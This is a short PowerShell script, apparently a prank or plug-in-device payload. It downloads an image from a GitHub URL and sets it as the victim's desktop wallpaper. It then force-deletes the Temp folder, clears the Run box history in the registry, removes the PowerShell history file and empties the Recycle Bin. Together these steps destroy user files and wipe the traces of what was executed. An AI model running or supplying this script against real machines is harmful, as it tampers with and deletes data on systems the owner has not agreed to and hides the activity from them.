$picture = "https://raw.githubusercontent.com/VBV11/VBV11/main/EDP.jpeg"

iwr $picture -OutFile $env:TEMP\image.jpg

$Image = "$env:TEMP\image.jpg"
$code = @'
using System.Runtime.InteropServices; 
namespace Win32 { 
    
    public class Wallpaper { 
        [DllImport("user32.dll", CharSet=CharSet.Auto)] 
        static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); 
         
        public static void SetWallpaper(string thePath) { 
            SystemParametersInfo(20, 0, thePath, 3); 
        }
    }
}
'@

Add-Type $code 
[Win32.Wallpaper]::SetWallpaper($Image)

# Delete contents of Temp folder 
Remove-Item $env:TEMP\* -Recurse -Force -ErrorAction SilentlyContinue

# Delete run box history
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f

# Delete powershell history
Remove-Item (Get-PSReadlineOption).HistorySavePath

# Delete contents of recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue
